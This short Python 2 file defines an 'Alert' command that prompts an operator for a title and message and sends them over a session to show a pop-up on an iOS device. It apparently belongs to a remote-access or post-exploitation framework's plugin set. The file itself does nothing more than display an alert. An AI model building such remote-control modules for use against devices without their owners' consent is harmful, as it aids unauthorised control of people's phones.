import base64
import json

class command:
    def __init__(self):
        self.name = "Alert"
        self.description = "Make Alert Pop-Up On The iOS Device!"
        self.type = "native"

    def run(self,session,cmd_data):
        title = raw_input("Alert Title: ")
        message = raw_input("Alert Message: ")
        session.send_command({"cmd":"alert","args":json.dumps({"Alert Title":title,"Alert Message":message})})
        return ""
